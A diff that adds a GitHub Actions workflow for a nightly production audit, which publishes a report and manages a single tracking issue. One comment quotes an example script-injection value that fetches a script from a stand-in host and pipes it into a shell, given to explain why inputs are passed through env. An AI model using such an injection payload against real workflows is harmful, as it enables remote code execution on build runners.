@@ -1,0 +1,103 @@
+name: Nightly production audit
+
+# Audits PRODUCTION, not the repository.
+#
+# Everything else scheduled here checks the codebase — CodeQL, dependency
+# freshness, Trivy. None of them would have caught a single one of the
+# production failures this project has actually had, because in every case
+# the code was correct and the deployed configuration was not:
+#
+#   * NEXT_PUBLIC_SITE_URL unset      -> every share link pointed at localhost
+#   * blob URL missing a Docker ARG   -> build behaved as if R2 did not exist
+#   * API returned absolute image URLs-> og:image dropped, links previewed bare
+#   * next.config.ts import not copied-> container crashed on every boot
+#
+# None produced an error anywhere. Each was found by a person looking.
+
+on:
+  schedule:
+    # 02:30 UTC = 08:00 IST — a report waiting at the start of the day
+    # rather than one that arrives overnight and is scrolled past.
+    - cron: "30 2 * * *"
+  workflow_dispatch:
+    inputs:
+      site:
+        description: "Override the site URL (e.g. a staging origin)"
+        required: false
+
+permissions:
+  contents: read
+  issues: write # to open/update the single tracking issue
+
+jobs:
+  audit:
+    name: Audit production
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v5
+      - uses: actions/setup-node@v6
+        with:
+          node-version: 24
+
+      - name: Run the audit
+        id: audit
+        # Values reach the script through `env:`, NEVER through `${{ }}`
+        # interpolated into the shell. A workflow_dispatch input is
+        # attacker-controlled, and interpolating it directly into a `run:`
+        # block is the classic Actions script-injection: a site value of
+        # `x";curl evil.sh|sh;"` would execute. Via env the shell only ever
+        # sees a variable reference, so the value cannot become code.
+        # Caught by CodeQL, which analyses workflow files too.
+        env:
+          AUDIT_EXPECTED_COMMIT: ${{ github.sha }}
+          AUDIT_SITE: ${{ inputs.site || 'https://laxair.shop' }}
+        # Never let a red audit abort the job — the report is the whole
+        # point, and a failed step would skip every step after it.
+        run: |
+          set +e
+          node scripts/production-audit.mjs > report.md 2>&1
+          echo "status=$?" >> "$GITHUB_OUTPUT"
+          cat report.md
+
+      - name: Publish to the run summary
+        # Readable without opening an issue or reading raw logs.
+        run: cat report.md >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Open or update the tracking issue
+        env:
+          GH_TOKEN: ${{ github.token }}
+          # Same rule: through env, not interpolated into the script.
+          AUDIT_STATUS: ${{ steps.audit.outputs.status }}
+        run: |
+          set +e
+          TITLE="Nightly production audit"
+          BODY_FILE=report.md
+
+          # One issue, updated — not a new issue per night. A job that
+          # files a fresh issue daily buries the signal it exists to raise.
+          EXISTING=$(gh issue list --state open --search "$TITLE in:title" \
+            --json number,title --jq ".[] | select(.title==\"$TITLE\") | .number" | head -1)
+
+          if [ "$AUDIT_STATUS" = "0" ]; then
+            # Green: close a previously-open issue, say nothing otherwise.
+            # A daily "all fine" comment trains people to ignore the issue.
+            if [ -n "$EXISTING" ]; then
+              gh issue comment "$EXISTING" --body-file "$BODY_FILE"
+              gh issue close "$EXISTING" --comment "Production audit is green again — closing."
+            fi
+            exit 0
+          fi
+
+          if [ -n "$EXISTING" ]; then
+            gh issue comment "$EXISTING" --body-file "$BODY_FILE"
+          else
+            gh issue create --title "$TITLE" --body-file "$BODY_FILE" --label bug
+          fi
+
+      - name: Fail the run if the audit failed
+        # Last, so the report is always published first.
+        if: steps.audit.outputs.status != '0'
+        run: |
+          echo "Production audit reported failures — see the summary above."
+          exit 1
